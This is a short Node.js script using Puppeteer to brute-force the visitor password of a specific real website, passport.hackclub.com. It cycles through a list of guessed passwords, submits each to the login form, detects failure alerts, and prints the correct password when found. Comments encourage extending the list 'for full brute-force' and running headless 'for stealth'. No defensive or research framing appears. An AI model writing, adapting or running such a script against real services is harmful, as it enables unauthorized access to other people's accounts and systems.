const puppeteer = require('puppeteer');

const combos = [
  'guest',
  'admin',
  'test123',
  'letmein',
  'hunter2',
  'zrlpassport',
  'passportzrl' // Replace or extend this list for full brute-force
];

(async () => {
  const browser = await puppeteer.launch({ headless: true }); // use headless: true for stealth
  const page = await browser.newPage();

  for (const password of combos) {
    console.log(`🔐 Trying: ${password}`);

    // Go to the login page again for every attempt
    await page.goto('https://passport.hackclub.com/', { waitUntil: 'networkidle2' });

    try {
      // Wait for password input
      await page.waitForSelector('input[aria-label="Enter visitor password"]', { timeout: 5000 });

      // Type the password
      await page.type('input[aria-label="Enter visitor password"]', password, { delay: 30 });

      // Submit and wait for navigation
      await Promise.all([
        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 8000 }),
        page.click('button.submit')
      ]);

      // After navigation, check for the alert (incorrect password)
      const isFailed = await page.$('.alert');
      if (isFailed) {
        console.log(`❌ Incorrect: ${password}`);
      } else {
        console.log(`✅ Success! Correct password is: ${password}`);
        break;
      }

    } catch (err) {
      console.log(`⚠️ Error trying "${password}": ${err.message}`);
    }

}

  await browser.close();
})();